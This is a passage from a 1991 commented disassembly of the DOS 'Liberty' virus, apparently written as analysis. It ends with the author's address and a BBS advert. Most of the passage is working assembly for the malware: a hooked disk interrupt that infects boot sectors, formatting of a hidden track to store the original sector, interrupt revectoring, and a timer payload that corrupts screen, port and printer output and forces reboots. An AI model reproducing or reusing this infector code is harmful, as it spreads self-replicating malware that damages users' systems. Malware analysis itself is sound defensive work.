CS:07F5 2E            CS:                                    
CS:07F6 8C0E1607      MOV [0716],CS                          
CS:07FA C3            RET
;
; Boot sectors are infected via vector 13h
;
CS:07FB 9C            PUSHF                                    
CS:07FC 80FC03        CMP AH,03                              
CS:07FF 7213          JB 0814                               
CS:0801 80FC05        CMP AH,05                              
CS:0804 730E          JNB 0814                               
CS:0806 80FA80        CMP DL,80                              
CS:0809 720F          JB 081A                               
CS:080B EB07          JMP 0814                               
CS:080D 90            NOP                                    
CS:080E 07            POP ES                                 
CS:080F 1F            POP DS                                 
CS:0810 5A            POP DX                                 
CS:0811 59            POP CX                                 
CS:0812 5B            POP BX                                 
CS:0813 58            POP AX                                 
CS:0814 9D            POPF                                    
CS:0815 EA00000000    JMP 0000:0000                          
CS:081A 50            PUSH AX                                 
CS:081B 53            PUSH BX                                 
CS:081C 51            PUSH CX                                 
CS:081D 52            PUSH DX                                 
CS:081E 1E            PUSH DS                                 
CS:081F 06            PUSH ES                                 
CS:0820 2E            CS:                                    
CS:0821 803E0C0401    CMP BYTE PTR [040C],01                 
CS:0826 74E6          JZ 080E                               
CS:0828 B80102        MOV AX,0201                ;
CS:082B 0E            PUSH CS                    ;
CS:082C 07            POP ES                     ;
CS:082D 0E            PUSH CS                    ;
CS:082E 1F            POP DS                     ;
CS:082F BB420C        MOV BX,0C42                ;
CS:0832 B90100        MOV CX,0001                ;
CS:0835 32F6          XOR DH,DH                  ;
CS:0837 9C            PUSHF                      ;
CS:0838 2E            CS:                        ;
CS:0839 FF1E1608      CALL FAR [0816]            ; Read bootsector
CS:083D 72CF          JB 080E                               
CS:083F 0E            PUSH CS                                 
CS:0840 1F            POP DS                                 
CS:0841 0E            PUSH CS                                 
CS:0842 07            POP ES                                 
CS:0843 BE420C        MOV SI,0C42                ;
CS:0846 BF3506        MOV DI,0635                ;
CS:0849 B90A00        MOV CX,000A                ;
CS:084C FC            CLD                        ;
CS:084D F3            REPZ                       ;
CS:084E A7            CMPSW                      ; Check infection
CS:084F 74BD          JZ 080E                               
CS:0851 B0FF          MOV AL,FF                              
CS:0853 884702        MOV [BX+02],AL                         
CS:0856 B80905        MOV AX,0509                ;
CS:0859 BBA607        MOV BX,07A6                ;
CS:085C B93128        MOV CX,2831                ;
CS:085F 9C            PUSHF                      ;
CS:0860 2E            CS:                        ;
CS:0861 FF1E1608      CALL FAR [0816]            ; Format track 28
CS:0865 72A7          JB 080E                               
CS:0867 B80103        MOV AX,0301                ;
CS:086A BB420C        MOV BX,0C42                ;
CS:086D B93F28        MOV CX,283F                ;
CS:0870 9C            PUSHF                      ;
CS:0871 2E            CS:                        ;
CS:0872 FF1E1608      CALL FAR [0816]            ; Write original bootsector
CS:0876 7296          JB 080E                               
CS:0878 B80103        MOV AX,0301                ;
CS:087B BB3506        MOV BX,0635                ;
CS:087E B90100        MOV CX,0001                ;
CS:0881 9C            PUSHF                      ;
CS:0882 2E            CS:                        ;
CS:0883 FF1E1608      CALL FAR [0816]            ; Write Liberty bootsector
CS:0887 7285          JB 080E                               
CS:0889 B80803        MOV AX,0308                ;
CS:088C BB1001        MOV BX,0110                ;
CS:088F B93128        MOV CX,2831                ;
CS:0892 9C            PUSHF                      ;
CS:0893 2E            CS:                        ;
CS:0894 FF1E1608      CALL FAR [0816]            ; Write Liberty bootsector
CS:0898 E973FF        JMP 080E                               
CS:089B 9C            PUSHF                                    
CS:089C 50            PUSH AX                                 
CS:089D 1E            PUSH DS                                 
CS:089E 33C0          XOR AX,AX                              
CS:08A0 8ED8          MOV DS,AX                              
CS:08A2 833E860000    CMP WORD PTR [0086],+00    ;
CS:08A7 750F          JNZ 08B8                   ; Check if DOS is installed
CS:08A9 833E840000    CMP WORD PTR [0084],+00    ;
CS:08AE 7508          JNZ 08B8                               
CS:08B0 1F            POP DS                                 
CS:08B1 58            POP AX                                 
CS:08B2 9D            POPF                                    
CS:08B3 EA00000000    JMP 0000:0000                          
CS:08B8 06            PUSH ES                                 
CS:08B9 0E            PUSH CS                                 
CS:08BA 07            POP ES                                 
CS:08BB E8C3F9        CALL 0281                  ; Get vector 21h
CS:08BE E8F1F9        CALL 02B2                  ; Set vector 21h
CS:08C1 E82000        CALL 08E4                  ; Disconnect vector 8h
CS:08C4 E8FBF9        CALL 02C2                  ; Set installation flag
CS:08C7 07            POP ES                                 
CS:08C8 EBE6          JMP 08B0
;
; Revectoring
;
CS:08CA A12000        MOV AX,[0020]                          
CS:08CD 2E            CS:                                    
CS:08CE A3B408        MOV [08B4],AX                          
CS:08D1 A12200        MOV AX,[0022]                          
CS:08D4 2E            CS:                                    
CS:08D5 A3B608        MOV [08B6],AX                          
CS:08D8 B89B08        MOV AX,089B                            
CS:08DB FA            CLI                                    
CS:08DC A32000        MOV [0020],AX                          
CS:08DF 8C0E2200      MOV [0022],CS                          
CS:08E3 C3            RET                                    
CS:08E4 33C0          XOR AX,AX                              
CS:08E6 8ED8          MOV DS,AX                              
CS:08E8 FA            CLI                                    
CS:08E9 2E            CS:                                    
CS:08EA A1B408        MOV AX,[08B4]                          
CS:08ED A32000        MOV [0020],AX                          
CS:08F0 2E            CS:                                    
CS:08F1 A1B608        MOV AX,[08B6]                          
CS:08F4 A32200        MOV [0022],AX                          
CS:08F7 C3            RET                                    
CS:08F8 A17000        MOV AX,[0070]                          
CS:08FB 2E            CS:                                    
CS:08FC A3900A        MOV [0A90],AX                          
CS:08FF A17200        MOV AX,[0072]                          
CS:0902 2E            CS:                                    
CS:0903 A3920A        MOV [0A92],AX                          
CS:0906 B8580A        MOV AX,0A58                            
CS:0909 FA            CLI                                    
CS:090A A37000        MOV [0070],AX                          
CS:090D 8C0E7200      MOV [0072],CS                          
CS:0911 C3            RET
;
; The next routine displays 'M A G I C   ! !' on the screen for a second
;
CS:0912 50            PUSH AX                                 
CS:0913 53            PUSH BX                                 
CS:0914 51            PUSH CX                                 
CS:0915 52            PUSH DX                                 
CS:0916 56            PUSH SI                                 
CS:0917 57            PUSH DI                                 
CS:0918 1E            PUSH DS                                 
CS:0919 06            PUSH ES                                 
CS:091A 9C            PUSHF                                    
CS:091B BB00B8        MOV BX,B800                ;
CS:091E 8EDB          MOV DS,BX                  ;
CS:0920 0E            PUSH CS                    ;
CS:0921 07            POP ES                     ;
CS:0922 33F6          XOR SI,SI                  ;
CS:0924 BF6809        MOV DI,0968                ;
CS:0927 B9A000        MOV CX,00A0                ;
CS:092A F3            REPZ                       ;
CS:092B A4            MOVSB                      ; Save screen
CS:092C BB00B8        MOV BX,B800                ;
CS:092F 8EC3          MOV ES,BX                  ;
CS:0931 0E            PUSH CS                    ;
CS:0932 1F            POP DS                     ;
CS:0933 33FF          XOR DI,DI                  ;
CS:0935 BB080A        MOV BX,0A08                ;
CS:0938 B95000        MOV CX,0050                ;
CS:093B B6CE          MOV DH,CE                  ;
CS:093D 8A17          MOV DL,[BX]                ;
CS:093F 80EA03        SUB DL,03                  ;
CS:0942 26            ES:                        ;
CS:0943 8915          MOV [DI],DX                ;
CS:0945 47            INC DI                     ;
CS:0946 47            INC DI                     ;
CS:0947 43            INC BX                     ;
CS:0948 E2F3          LOOP 093D                  ; Put text on screen
CS:094A E2FE          LOOP 094A                  ; Wait
CS:094C BB00B8        MOV BX,B800                ;
CS:094F 8EC3          MOV ES,BX                  ;
CS:0951 0E            PUSH CS                    ;
CS:0952 1F            POP DS                     ;
CS:0953 33FF          XOR DI,DI                  ;
CS:0955 BE6809        MOV SI,0968                ;
CS:0958 B9A000        MOV CX,00A0                ;
CS:095B F3            REPZ                       ;
CS:095C A4            MOVSB                      ; Restore screen
CS:095D 9D            POPF                                    
CS:095E 07            POP ES                                 
CS:095F 1F            POP DS                                 
CS:0960 5F            POP DI                                 
CS:0961 5E            POP SI                                 
CS:0962 5A            POP DX                                 
CS:0963 59            POP CX                                 
CS:0964 5B            POP BX                                 
CS:0965 58            POP AX                                 
CS:0966 C3            RET                                    
;
; A temporary screen buffer
;
DS:0960                          4D 41 47 49 43 4D 41 47
DS:0970  49 43 4D 41 47 49 43 4D-41 47 49 43 4D 41 47 49
DS:0980  43 4D 41 47 49 43 4D 41-47 49 43 4D 41 47 49 43
DS:0990  4D 41 47 49 43 4D 41 47-49 43 4D 41 47 49 43 4D
DS:09A0  41 47 49 43 4D 41 47 49-43 4D 41 47 49 43 4D 41
DS:09B0  47 49 43 4D 41 47 49 43-4D 41 47 49 43 4D 41 47
DS:09C0  49 43 4D 41 47 49 43 4D-41 47 49 43 4D 41 47 49
DS:09D0  43 4D 41 47 49 43 4D 41-47 49 43 4D 41 47 49 43
DS:09E0  4D 41 47 49 43 4D 41 47-49 43 4D 41 47 49 43 4D
DS:09F0  41 47 49 43 4D 41 47 49-43 4D 41 47 49 43 4D 41
DS:0A00  47 49 43 4D 41 47 49 43
;
; The encrypted text 'M A G I C   ! !'
;
DS:0A00                          23 23 23 23 23 23 23 23
DS:0A10  23 23 23 23 23 23 23 23-23 23 23 23 23 23 23 23
DS:0A20  23 23 23 23 23 23 23 23-23 23 23 23 23 23 23 23
DS:0A30  23 23 23 23 23 23 23 23-23 23 50 23 44 23 4A 23
DS:0A40  4C 23 46 23 23 24 23 24-23 24 23 23 23 23 23 23
DS:0A50  23 23 23 23 23 23 23 23
;
; The next routine is the timer routine. It activates all the gadgets.
;
CS:0A58 9C            PUSHF 
CS:0A59 50            PUSH AX                                 
CS:0A5A 1E            PUSH DS                                 
CS:0A5B 2E            CS:                                    
CS:0A5C FF06940A      INC WORD PTR [0A94]                    
CS:0A60 2E            CS:                                    
CS:0A61 833E960A0B    CMP WORD PTR [0A96],+0B    ; Time for a reboot ?
CS:0A66 7433          JZ 0A9B                               
CS:0A68 2E            CS:                                    
CS:0A69 A1980A        MOV AX,[0A98]                          
CS:0A6C 2E            CS:                                    
CS:0A6D 3906940A      CMP [0A94],AX              ; Time for gadgets on ?
CS:0A71 7430          JZ 0AA3                               
CS:0A73 7217          JB 0A8C                               
CS:0A75 050002        ADD AX,0200                            
CS:0A78 2E            CS:                                    
CS:0A79 3906940A      CMP [0A94],AX              ; Time for gadgets off ?
CS:0A7D 7446          JZ 0AC5                               
CS:0A7F 770B          JA 0A8C                               
CS:0A81 2E            CS:                                    
CS:0A82 833E960A0A    CMP WORD PTR [0A96],+0A    ; Time for screen messing ?
CS:0A87 7503          JNZ 0A8C                               
CS:0A89 E886FE        CALL 0912                  ; Mess up screen
CS:0A8C 1F            POP DS                                 
CS:0A8D 58            POP AX                                 
CS:0A8E 9D            POPF                                    
CS:0A8F EA00000000    JMP 0000:0000              ; Continue
CS:0A9B B8FFFF        MOV AX,FFFF
CS:0A9E 50            PUSH AX                                 
CS:0A9F 33C0          XOR AX,AX                              
CS:0AA1 50            PUSH AX                                 
CS:0AA2 CB            RETF                                    
CS:0AA3 2E            CS:                                    
CS:0AA4 812E980A5001  SUB WORD PTR [0A98],0150               
CS:0AAA 33C0          XOR AX,AX                              
CS:0AAC 8ED8          MOV DS,AX                              
CS:0AAE 2E            CS:                                    
CS:0AAF C606470B00    MOV BYTE PTR [0B47],00                 
CS:0AB4 90            NOP                                    
CS:0AB5 2E            CS:                                    
CS:0AB6 C606950B00    MOV BYTE PTR [0B95],00                 
CS:0ABB 90            NOP                                    
CS:0ABC 2E            CS:                                    
CS:0ABD C606080C00    MOV BYTE PTR [0C08],00                 
CS:0AC2 90            NOP                                    
CS:0AC3 EBC7          JMP 0A8C                               
CS:0AC5 2E            CS:                                    
CS:0AC6 C606470BFF    MOV BYTE PTR [0B47],FF                 
CS:0ACB 90            NOP                                    
CS:0ACC 2E            CS:                                    
CS:0ACD C606950BFF    MOV BYTE PTR [0B95],FF                 
CS:0AD2 90            NOP                                    
CS:0AD3 2E            CS:                                    
CS:0AD4 C606080CFF    MOV BYTE PTR [0C08],FF                 
CS:0AD9 90            NOP                                    
CS:0ADA 2E            CS:                                    
CS:0ADB C706940A0000  MOV WORD PTR [0A94],0000               
CS:0AE1 2E            CS:                                    
CS:0AE2 FF06960A      INC WORD PTR [0A96]                    
CS:0AE6 EBA4          JMP 0A8C                               
CS:0AE8 A14000        MOV AX,[0040]                          
CS:0AEB 2E            CS:                                    
CS:0AEC A3430B        MOV [0B43],AX                          
CS:0AEF A14200        MOV AX,[0042]                          
CS:0AF2 2E            CS:                                    
CS:0AF3 A3450B        MOV [0B45],AX                          
CS:0AF6 B8360B        MOV AX,0B36                            
CS:0AF9 FA            CLI                                    
CS:0AFA A34000        MOV [0040],AX                          
CS:0AFD 8C0E4200      MOV [0042],CS                          
CS:0B01 C3            RET                                    
CS:0B02 FA            CLI                                    
CS:0B03 A15000        MOV AX,[0050]                          
CS:0B06 2E            CS:                                    
CS:0B07 A3910B        MOV [0B91],AX                          
CS:0B0A A15200        MOV AX,[0052]                          
CS:0B0D 2E            CS:                                    
CS:0B0E A3930B        MOV [0B93],AX                          
CS:0B11 B8840B        MOV AX,0B84                            
CS:0B14 A35000        MOV [0050],AX                          
CS:0B17 8C0E5200      MOV [0052],CS                          
CS:0B1B C3            RET                                    
CS:0B1C FA            CLI                                    
CS:0B1D A15C00        MOV AX,[005C]                          
CS:0B20 2E            CS:                                    
CS:0B21 A3040C        MOV [0C04],AX                          
CS:0B24 A15E00        MOV AX,[005E]                          
CS:0B27 2E            CS:                                    
CS:0B28 A3060C        MOV [0C06],AX                          
CS:0B2B B8FC0B        MOV AX,0BFC                            
CS:0B2E A35C00        MOV [005C],AX                          
CS:0B31 8C0E5E00      MOV [005E],CS
CS:0B35 C3            RET
;
; Now the gadgets' routines. When activated, only the word MAGIC!! will be
; sent to screen, port, and printer.
;
CS:0B36 9C            PUSHF                      ; Screen
CS:0B37 80FC09        CMP AH,09                              
CS:0B3A 740F          JZ 0B4B                               
CS:0B3C 80FC0A        CMP AH,0A                              
CS:0B3F 740A          JZ 0B4B                               
CS:0B41 9D            POPF                                    
CS:0B42 EA00000000    JMP 0000:0000                          
CS:0B4B 2E            CS: 
CS:0B4C 803E470BFF    CMP BYTE PTR [0B47],FF                 
CS:0B51 74EE          JZ 0B41                               
CS:0B53 53            PUSH BX                                 
CS:0B54 56            PUSH SI                                 
CS:0B55 50            PUSH AX                                 
CS:0B56 33DB          XOR BX,BX                              
CS:0B58 2E            CS:                                    
CS:0B59 833E480B07    CMP WORD PTR [0B48],+07                
CS:0B5E 7507          JNZ 0B67                               
CS:0B60 2E            CS:                                    
CS:0B61 C706480B0000  MOV WORD PTR [0B48],0000               
CS:0B67 2E            CS:                                    
CS:0B68 8B1E480B      MOV BX,[0B48]                          
CS:0B6C 2E            CS:                                    
CS:0B6D 8B3E480B      MOV DI,[0B48]                          
CS:0B71 47            INC DI                                 
CS:0B72 2E            CS:                                    
CS:0B73 893E480B      MOV [0B48],DI                          
CS:0B77 BE3B0C        MOV SI,0C3B                            
CS:0B7A 58            POP AX                                 
CS:0B7B 2E            CS:                                    
CS:0B7C 8A00          MOV AL,[BX+SI]                         
CS:0B7E FEC0          INC AL                                 
CS:0B80 5E            POP SI                                 
CS:0B81 5B            POP BX                                 
CS:0B82 EBBD          JMP 0B41                               
CS:0B84 9C            PUSHF                      ; Port
CS:0B85 80FC01        CMP AH,01                              
CS:0B88 740D          JZ 0B97                               
CS:0B8A 80FC02        CMP AH,02                              
CS:0B8D 7436          JZ 0BC5                               
CS:0B8F 9D            POPF                                    
CS:0B90 EA00000000    JMP 0000:0000                          
CS:0B97 2E            CS: 
CS:0B98 803E950BFF    CMP BYTE PTR [0B95],FF                 
CS:0B9D 74F0          JZ 0B8F                               
CS:0B9F 53            PUSH BX                                 
CS:0BA0 56            PUSH SI                                 
CS:0BA1 33DB          XOR BX,BX                              
CS:0BA3 2E            CS:                                    
CS:0BA4 8A1E960B      MOV BL,[0B96]                          
CS:0BA8 BE3B0C        MOV SI,0C3B                            
CS:0BAB 2E            CS:                                    
CS:0BAC 8A00          MOV AL,[BX+SI]                         
CS:0BAE 2E            CS:                                    
CS:0BAF FE06960B      INC BYTE PTR [0B96]                    
CS:0BB3 2E            CS:                                    
CS:0BB4 803E960B07    CMP BYTE PTR [0B96],07                 
CS:0BB9 7506          JNZ 0BC1                               
CS:0BBB 2E            CS:                                    
CS:0BBC C606960B00    MOV BYTE PTR [0B96],00                 
CS:0BC1 5E            POP SI                                 
CS:0BC2 5B            POP BX                                 
CS:0BC3 EBCA          JMP 0B8F                               
CS:0BC5 2E            CS:                                    
CS:0BC6 803E950BFF    CMP BYTE PTR [0B95],FF                 
CS:0BCB 74C2          JZ 0B8F                               
CS:0BCD 2E            CS:                                    
CS:0BCE FF1E910B      CALL FAR [0B91]                         
CS:0BD2 80FC00        CMP AH,00                              
CS:0BD5 7F24          JG 0BFB                               
CS:0BD7 53            PUSH BX                                 
CS:0BD8 56            PUSH SI                                 
CS:0BD9 33DB          XOR BX,BX                              
CS:0BDB 2E            CS:                                    
CS:0BDC 8A1E960B      MOV BL,[0B96]                          
CS:0BE0 BE3B0C        MOV SI,0C3B                            
CS:0BE3 2E            CS:                                    
CS:0BE4 8A00          MOV AL,[BX+SI]                         
CS:0BE6 2E            CS:                                    
CS:0BE7 FE06960B      INC BYTE PTR [0B96]                    
CS:0BEB 2E            CS:                                    
CS:0BEC 803E960B07    CMP BYTE PTR [0B96],07                 
CS:0BF1 7506          JNZ 0BF9                               
CS:0BF3 2E            CS:                                    
CS:0BF4 C606960B00    MOV BYTE PTR [0B96],00                 
CS:0BF9 5E            POP SI                                 
CS:0BFA 5B            POP BX                                 
CS:0BFB CF            IRET                                    
CS:0BFC 9C            PUSHF                      ; Printer
CS:0BFD 80FC00        CMP AH,00                              
CS:0C00 7407          JZ 0C09                               
CS:0C02 9D            POPF                                    
CS:0C03 EA00000000    JMP 0000:0000                          
CS:0C09 2E            CS: 
CS:0C0A 803E080CFF    CMP BYTE PTR [0C08],FF                 
CS:0C0F 74F1          JZ 0C02                               
CS:0C11 53            PUSH BX                                 
CS:0C12 56            PUSH SI                                 
CS:0C13 33DB          XOR BX,BX                              
CS:0C15 2E            CS:                                    
CS:0C16 8A1E3A0C      MOV BL,[0C3A]                          
CS:0C1A BE3B0C        MOV SI,0C3B                            
CS:0C1D 2E            CS:                                    
CS:0C1E 8A00          MOV AL,[BX+SI]                         
CS:0C20 FEC0          INC AL                                 
CS:0C22 2E            CS:                                    
CS:0C23 FE063A0C      INC BYTE PTR [0C3A]                    
CS:0C27 2E            CS:                                    
CS:0C28 803E3A0C07    CMP BYTE PTR [0C3A],07                 
CS:0C2D 7507          JNZ 0C36                               
CS:0C2F 2E            CS:                                    
CS:0C30 C6063A0C00    MOV BYTE PTR [0C3A],00                 
CS:0C35 90            NOP                                    
CS:0C36 5E            POP SI                                 
CS:0C37 5B            POP BX                                 
CS:0C38 EBC8          JMP 0C02                               
;
; The encrypted text 'MAGIC!!'
;
DS:0C3A               4C 40 46 48 42 20 20
;
; Important note:
; When there is no longer space on the disk to infect a file, the Liberty
; virus will infect the bootsector. This is done in the 'OHIO' way.
;
;
;
; End of Liberty (2867) disassembly. (c) 1991 by Remco van Helvoort.
; This document may be freely shared. If you have any comments or some
; nice little viruses for analysis, feel free to drop me a note.
;
; Remco van Helvoort
; Bredastraat 3
; 5224 VD 's-Hertogenbosch
; Holland
;

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
; 컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
; 컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

